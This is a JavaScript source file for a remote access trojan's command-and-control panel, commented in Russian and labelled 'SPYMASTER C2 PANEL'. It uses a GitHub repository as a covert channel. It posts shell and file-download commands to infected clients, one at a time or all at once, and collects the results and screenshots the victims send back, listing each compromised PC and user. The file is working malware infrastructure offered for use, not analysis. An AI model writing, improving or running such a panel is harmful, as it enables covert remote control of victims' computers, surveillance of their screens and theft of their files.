// ============= SPYMASTER C2 PANEL - РАБОЧАЯ ВЕРСИЯ (ВСЕ КНОПКИ) =============
// АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ

// ============= КОНФИГУРАЦИЯ =============
let GITHUB_USERNAME = "gitnikaaaa";
let GITHUB_REPO = "rat_c2";
let GITHUB_TOKEN = "";

// Загрузка сохранённых данных
try {
    if (typeof CONFIG !== 'undefined') {
        GITHUB_USERNAME = CONFIG.GITHUB_USERNAME || GITHUB_USERNAME;
        GITHUB_TOKEN = CONFIG.GITHUB_TOKEN || "";
    }
} catch(e) {}

if (!GITHUB_TOKEN) {
    const savedToken = localStorage.getItem("github_token");
    if (savedToken) {
        GITHUB_TOKEN = savedToken;
    } else {
        GITHUB_TOKEN = prompt("🔐 ВВЕДИТЕ ТОКЕН GITHUB:");
        if (GITHUB_TOKEN) localStorage.setItem("github_token", GITHUB_TOKEN);
    }
}

if (GITHUB_USERNAME === "твой_логин") {
    const savedUser = localStorage.getItem("github_username");
    if (savedUser) {
        GITHUB_USERNAME = savedUser;
    } else {
        GITHUB_USERNAME = prompt("👤 ВВЕДИТЕ LOGIN GITHUB:");
        if (GITHUB_USERNAME) localStorage.setItem("github_username", GITHUB_USERNAME);
    }
}

// ============= ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =============
const API_URL = `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents`;
const HEADERS = {
    "Authorization": `token ${GITHUB_TOKEN}`,
    "Accept": "application/vnd.github.v3+json"
};

let clients = [];
let seenFiles = [];
let autoRefresh = null;
let currentClient = "all";

// ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
function addLog(message, type = "system") {
    const logContainer = document.getElementById("logContainer");
    if (!logContainer) return;
    const time = new Date().toLocaleTimeString();
    const logEntry = document.createElement("div");
    logEntry.className = `log-entry ${type}`;
    logEntry.innerHTML = `<span style="color:#666">[${time}]</span> ${message}`;
    logContainer.insertBefore(logEntry, logContainer.firstChild);
    while (logContainer.children.length > 300) {
        logContainer.removeChild(logContainer.lastChild);
    }
}

function showNotification(message, type = "info") {
    const notification = document.createElement("div");
    notification.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: ${type === "success" ? "#00aa00" : type === "error" ? "#aa0000" : "#1a1f4e"};
        color: #fff;
        padding: 10px 20px;
        border-radius: 5px;
        font-family: monospace;
        font-size: 12px;
        z-index: 1000;
        animation: fadeInOut 3s ease;
    `;
    notification.innerText = message;
    document.body.appendChild(notification);
    setTimeout(() => notification.remove(), 3000);
}

function showSendingIndicator(show) {
    let indicator = document.getElementById("sendingIndicator");
    if (!indicator) {
        indicator = document.createElement("div");
        indicator.id = "sendingIndicator";
        indicator.style.cssText = `
            position: fixed;
            top: 10px;
            right: 10px;
            background: #ff8800;
            color: #fff;
            padding: 8px 15px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            z-index: 1000;
            display: none;
        `;
        indicator.innerHTML = "⏳ ОТПРАВКА...";
        document.body.appendChild(indicator);
    }
    indicator.style.display = show ? "block" : "none";
}

// ============= ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ КОМАНД =============
async function sendCommand(command, clientId = null) {
    if (!command) return;
    
    const targetClient = clientId || currentClient || "all";
    let finalCommand = command;
    if (targetClient !== "all") {
        finalCommand = `@${targetClient} ${command}`;
    }
    
    addLog(`📨 ОТПРАВКА: ${finalCommand}`, "system");
    showSendingIndicator(true);
    
    try {
        const cacheBuster = `?t=${Date.now()}&_=${Math.random()}`;
        
        let response = await fetch(`${API_URL}/commands.txt${cacheBuster}`, {
            headers: HEADERS,
            cache: 'no-store'
        });
        
        let currentContent = "";
        let sha = null;
        
        if (response.status === 200) {
            const data = await response.json();
            currentContent = atob(data.content);
            sha = data.sha;
        } else if (response.status === 404) {
            addLog(`📝 СОЗДАЮ commands.txt...`, "system");
        } else {
            addLog(`❌ ОШИБКА: ${response.status}`, "error");
            showSendingIndicator(false);
            return;
        }
        
        const newContent = currentContent + finalCommand + " #" + Date.now() + "\n";
        const encodedContent = btoa(unescape(encodeURIComponent(newContent)));
        
        const putData = {
            message: `Command: ${command}`,
            content: encodedContent,
            branch: "main"
        };
        if (sha) putData.sha = sha;
        
        let success = false;
        for (let attempt = 1; attempt <= 3; attempt++) {
            try {
                const putResponse = await fetch(`${API_URL}/commands.txt`, {
                    method: "PUT",
                    headers: HEADERS,
                    body: JSON.stringify(putData)
                });
                
                if (putResponse.status === 200 || putResponse.status === 201) {
                    addLog(`✅ ОТПРАВЛЕНО! (${attempt})`, "success");
                    showNotification(`✅ ${command}`, "success");
                    success = true;
                    break;
                } else if (putResponse.status === 409) {
                    addLog(`⚠️ КОНФЛИКТ, ПОВТОР... (${attempt})`, "warning");
                    const freshResponse = await fetch(`${API_URL}/commands.txt${cacheBuster}`, {
                        headers: HEADERS,
                        cache: 'no-store'
                    });
                    if (freshResponse.status === 200) {
                        const freshData = await freshResponse.json();
                        putData.sha = freshData.sha;
                        continue;
                    }
                }
            } catch (err) {
                addLog(`⚠️ ОШИБКА: ${err.message} (${attempt})`, "error");
            }
            if (attempt < 3) await new Promise(r => setTimeout(r, 1000));
        }
        
        if (!success) {
            addLog(`❌ НЕ УДАЛОСЬ ОТПРАВИТЬ`, "error");
        }
        
    } catch (error) {
        addLog(`❌ ОШИБКА: ${error.message}`, "error");
    }
    
    showSendingIndicator(false);
}

// ============= ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
async function loadResults() {
    try {
        const cacheBuster = `?t=${Date.now()}`;
        const response = await fetch(`${API_URL}${cacheBuster}`, { headers: HEADERS });
        if (!response.ok) return;
        
        const files = await response.json();
        if (!Array.isArray(files)) return;
        
        const results = files.filter(f => f.name.startsWith("result_"));
        const screenshots = files.filter(f => f.name.startsWith("screenshot_"));
        
        const resultsCount = document.getElementById("resultsCount");
        const screensCount = document.getElementById("screensCount");
        const clientsCount = document.getElementById("clientsCount");
        if (resultsCount) resultsCount.innerText = results.length;
        if (screensCount) screensCount.innerText = screenshots.length;
        if (clientsCount) clientsCount.innerText = clients.length;
        
        for (const file of results) {
            if (!seenFiles.includes(file.name)) {
                seenFiles.push(file.name);
                const content = await fetch(file.download_url + cacheBuster).then(r => r.text());
                addLog(`📥 ${file.name}`, "result");
                const lines = content.split('\n').slice(0, 5);
                for (const line of lines) {
                    if (line.trim()) addLog(`   ${line.substring(0, 100)}`, "result");
                }
                
                if (content.includes("PC:")) {
                    const pcMatch = content.match(/PC:\s*([^\n]+)/);
                    const userMatch = content.match(/User:\s*([^\n]+)/);
                    if (pcMatch && !clients.find(c => c.id === pcMatch[1])) {
                        clients.push({
                            id: pcMatch[1],
                            user: userMatch ? userMatch[1] : "Unknown",
                            firstSeen: new Date().toLocaleString()
                        });
                        updateClientsList();
                        addLog(`💻 НОВЫЙ КЛИЕНТ: ${pcMatch[1]}`, "client");
                    }
                }
            }
        }
        
        const grid = document.getElementById("screensGrid");
        if (grid && screenshots.length > 0) {
            grid.innerHTML = "";
            for (const shot of screenshots.slice(-6).reverse()) {
                const card = document.createElement("div");
                card.className = "screenshot-card";
                card.onclick = () => window.open(shot.download_url, '_blank');
                card.innerHTML = `<img src="${shot.download_url}${cacheBuster}" style="width:100%;height:100px;object-fit:cover"><div style="padding:5px;font-size:10px">${shot.name}</div>`;
                grid.appendChild(card);
            }
        }
        
    } catch (error) {
        addLog(`❌ Ошибка загрузки: ${error.message}`, "error");
    }
}

function updateClientsList() {
    const select = document.getElementById("clientSelect");
    if (!select) return;
    select.innerHTML = '<option value="all">📱 ВСЕ КЛИЕНТЫ</option>';
    for (const client of clients) {
        select.innerHTML += `<option value="${client.id}">🖥️ ${client.id}</option>`;
    }
}

async function clearCommands() {
    try {
        const cacheBuster = `?t=${Date.now()}`;
        const response = await fetch(`${API_URL}/commands.txt${cacheBuster}`, { headers: HEADERS });
        if (response.status === 200) {
            const data = await response.json();
            const deleteData = {
                message: "Clear commands",
                content: btoa(""),
                sha: data.sha,
                branch: "main"
            };
            await fetch(`${API_URL}/commands.txt`, {
                method: "PUT",
                headers: HEADERS,
                body: JSON.stringify(deleteData)
            });
            addLog("🗑 КОМАНДЫ ОЧИЩЕНЫ", "success");
        }
    } catch (error) {
        addLog(`❌ Ошибка очистки: ${error.message}`, "error");
    }
}

async function testConnection() {
    addLog("🔌 ПРОВЕРКА ПОДКЛЮЧЕНИЯ...", "system");
    try {
        const response = await fetch("https://api.github.com/user", { headers: HEADERS });
        if (response.ok) {
            const user = await response.json();
            addLog(`✅ ПОДКЛЮЧЕНО! ПОЛЬЗОВАТЕЛЬ: ${user.login}`, "success");
            const indicator = document.getElementById("statusIndicator");
            const statusText = document.getElementById("statusText");
            if (indicator) indicator.classList.add("online");
            if (statusText) statusText.innerHTML = `✅ ПОДКЛЮЧЕН | ${user.login}`;
            return true;
        } else {
            addLog(`❌ ОШИБКА: ${response.status}`, "error");
            return false;
        }
    } catch (error) {
        addLog(`❌ ОШИБКА: ${error.message}`, "error");
        return false;
    }
}

function startAutoRefresh() {
    if (autoRefresh) clearInterval(autoRefresh);
    autoRefresh = setInterval(() => loadResults(), 8000);
    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО", "system");
}

// ============= ИНИЦИАЛИЗАЦИЯ =============
function init() {
    addLog("🐀 SPYMASTER C2 PANEL v5.0", "system");
    addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system");
    
    // Добавляем стили
    if (!document.querySelector("#dynamic-styles")) {
        const style = document.createElement('style');
        style.id = "dynamic-styles";
        style.textContent = `
            @keyframes fadeInOut { 0% { opacity: 0; transform: translateX(20px); } 15% { opacity: 1; transform: translateX(0); } 85% { opacity: 1; transform: translateX(0); } 100% { opacity: 0; transform: translateX(20px); } }
            .log-entry.success { border-left-color: #00ff41; color: #00ff41; }
            .log-entry.error { border-left-color: #ff4444; color: #ff8888; }
            .log-entry.system { border-left-color: #ffaa00; color: #ffaa88; }
            .log-entry.client { border-left-color: #00aaff; color: #88ccff; }
            .log-entry.result { border-left-color: #aa44ff; color: #cc88ff; }
            .log-entry { background: #0a0e27; border-radius: 3px; margin-bottom: 5px; padding: 5px 10px; border-left: 3px solid; font-family: monospace; font-size: 12px; }
            .screenshot-card { cursor: pointer; border: 1px solid #00ff41; border-radius: 5px; overflow: hidden; background: #0a0e27; }
            .client-card { cursor: pointer; }
        `;
        document.head.appendChild(style);
    }
    
    testConnection();
    startAutoRefresh();
    loadResults();
    
    // ============= ПРИВЯЗКА ВСЕХ КНОПОК (ГЛАВНОЕ ИСПРАВЛЕНИЕ) =============
    
    // 1. Кнопки быстрых команд (.cmd-btn)
    document.querySelectorAll('.cmd-btn').forEach(btn => {
        btn.removeEventListener('click', btn._handler);
        btn._handler = () => {
            const cmd = btn.getAttribute('data-cmd');
            if (cmd) sendCommand(cmd);
        };
        btn.addEventListener('click', btn._handler);
    });
    
    // 2. Маленькие кнопки (.cmd-small)
    document.querySelectorAll('.cmd-small').forEach(btn => {
        if (btn.id === 'sendCustomBtn' || btn.id === 'downloadBtn' || btn.id === 'shellBtn') return;
        btn.removeEventListener('click', btn._handler);
        btn._handler = () => {
            const cmd = btn.getAttribute('data-cmd');
            if (cmd) sendCommand(cmd);
        };
        btn.addEventListener('click', btn._handler);
    });
    
    // 3. Кнопка отправки кастомной команды
    const sendCustomBtn = document.getElementById('sendCustomBtn');
    if (sendCustomBtn) {
        sendCustomBtn.removeEventListener('click', sendCustomBtn._handler);
        sendCustomBtn._handler = () => {
            const input = document.getElementById('customCmd');
            if (input && input.value) {
                sendCommand(input.value);
                input.value = '';
            }
        };
        sendCustomBtn.addEventListener('click', sendCustomBtn._handler);
    }
    
    // 4. Кнопка Download
    const downloadBtn = document.getElementById('downloadBtn');
    if (downloadBtn) {
        downloadBtn.removeEventListener('click', downloadBtn._handler);
        downloadBtn._handler = () => {
            const input = document.getElementById('downloadPath');
            if (input && input.value) {
                sendCommand(`/download ${input.value}`);
            }
        };
        downloadBtn.addEventListener('click', downloadBtn._handler);
    }
    
    // 5. Кнопка Shell
    const shellBtn = document.getElementById('shellBtn');
    if (shellBtn) {
        shellBtn.removeEventListener('click', shellBtn._handler);
        shellBtn._handler = () => {
            const input = document.getElementById('shellCmd');
            if (input && input.value) {
                sendCommand(`/cmd ${input.value}`);
            }
        };
        shellBtn.addEventListener('click', shellBtn._handler);
    }
    
    // 6. Кнопка очистки команд
    const clearBtn = document.getElementById('clearCommandsBtn');
    if (clearBtn) {
        clearBtn.removeEventListener('click', clearBtn._handler);
        clearBtn._handler = () => clearCommands();
        clearBtn.addEventListener('click', clearBtn._handler);
    }
    
    // 7. Кнопка обновления
    const refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) {
        refreshBtn.removeEventListener('click', refreshBtn._handler);
        refreshBtn._handler = () => {
            loadResults();
            addLog("🔄 ОБНОВЛЕНО", "system");
        };
        refreshBtn.addEventListener('click', refreshBtn._handler);
    }
    
    // 8. Кнопка очистки всего
    const clearAllBtn = document.getElementById('clearAllBtn');
    if (clearAllBtn) {
        clearAllBtn.removeEventListener('click', clearAllBtn._handler);
        clearAllBtn._handler = () => {
            if (confirm("💣 Удалить ВСЕ файлы? Файлы сайта НЕ будут затронуты!")) {
                addLog("💣 ОЧИСТКА РЕПОЗИТОРИЯ...", "system");
                // Функция очистки
                (async () => {
                    const response = await fetch(`${API_URL}?t=${Date.now()}`, { headers: HEADERS });
                    if (response.ok) {
                        const files = await response.json();
                        const protectedFiles = ["index.html", "style.css", "script.js", "config.js", ".gitignore"];
                        let deleted = 0;
                        for (const file of files) {
                            if (protectedFiles.includes(file.name)) continue;
                            await fetch(`${API_URL}/${file.name}`, {
                                method: "DELETE",
                                headers: HEADERS,
                                body: JSON.stringify({ message: "Delete", sha: file.sha, branch: "main" })
                            });
                            deleted++;
                            await new Promise(r => setTimeout(r, 100));
                        }
                        addLog(`💣 УДАЛЕНО: ${deleted} файлов`, "success");
                        seenFiles = [];
                        clients = [];
                        loadResults();
                    }
                })();
            }
        };
        clearAllBtn.addEventListener('click', clearAllBtn._handler);
    }
    
    // 9. Выбор клиента
    const clientSelect = document.getElementById('clientSelect');
    if (clientSelect) {
        clientSelect.removeEventListener('change', clientSelect._handler);
        clientSelect._handler = (e) => {
            currentClient = e.target.value;
            addLog(`🎯 ВЫБРАН: ${currentClient === "all" ? "ВСЕ КЛИЕНТЫ" : currentClient}`, "system");
        };
        clientSelect.addEventListener('change', clientSelect._handler);
    }
    
    // 10. Вкладки
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.removeEventListener('click', btn._handler);
        btn._handler = () => {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            btn.classList.add('active');
            const tabId = `${btn.getAttribute('data-tab')}Tab`;
            const tabContent = document.getElementById(tabId);
            if (tabContent) tabContent.classList.add('active');
        };
        btn.addEventListener('click', btn._handler);
    });
    
    addLog("✅ ИНТЕРФЕЙС ЗАГРУЖЕН, ВСЕ КНОПКИ АКТИВНЫ", "success");
}

// Запуск
if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
} else {
    init();
}
